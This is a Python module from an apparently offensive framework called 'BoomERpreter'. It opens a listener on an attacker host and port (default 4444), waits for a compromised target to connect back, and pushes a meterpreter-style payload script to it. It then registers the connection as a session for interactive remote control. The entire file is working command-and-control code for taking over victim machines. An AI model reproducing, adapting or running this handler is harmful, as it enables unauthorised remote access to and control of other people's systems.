import socket
import struct
from os import sep

from extra_functions.sessions.session import Session
from module import Module


class BoomerModule(Module):
    def __init__(self):
        info = {"Name": "BoomERpreter",
                "Author": "Josue Encinar",
                "Description": "Open a channel to interact with a targer",
                }
        options = {
            "lport": ["Open a local port to receive the connection", 4444, True],
            "lhost": ["Local host to receive the connection", "192.168.206.131", True]
        }
        self.sessions = Session.getInstance()
        super(BoomerModule, self).__init__(options, info)

    def run(self):
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # sock.settimeout(10)
        # Bind the socket to the port
        server_address = (self.options["lhost"][1], int(self.options["lport"][1]))
        print('starting up on %s port %s' % server_address)
        sock.bind(server_address)
        # Listen for incoming connections
        sock.listen(1)
        try:
            print('waiting for a connection')
            client, client_address = sock.accept()
            try:
                print(f'Sending BoomErpreter --> {client_address[0]}:{str(client_address[1])}')
                file_boomer = f"support{sep}boomerpreter{sep}boomerpreter.py"
                meterpreter = open(file_boomer, "r").read()
                meterpreter = meterpreter.encode()
                l = struct.pack('>I', len(meterpreter))
                client.send(l)
                c = client.send(meterpreter)
                if c == 0:
                    return
                print(f"{str(c)} bytes have been sent")
                platform = client.recv(1024)
                session_id = self.sessions.set_session(client, platform.decode())
                self.print_info(f"Session {str(session_id)} has been created")
                if res := self.sessions.interact(session_id):
                    return
            except Exception as e:
                print(e)
        except Exception:
            pass
        finally:
            sock.close()
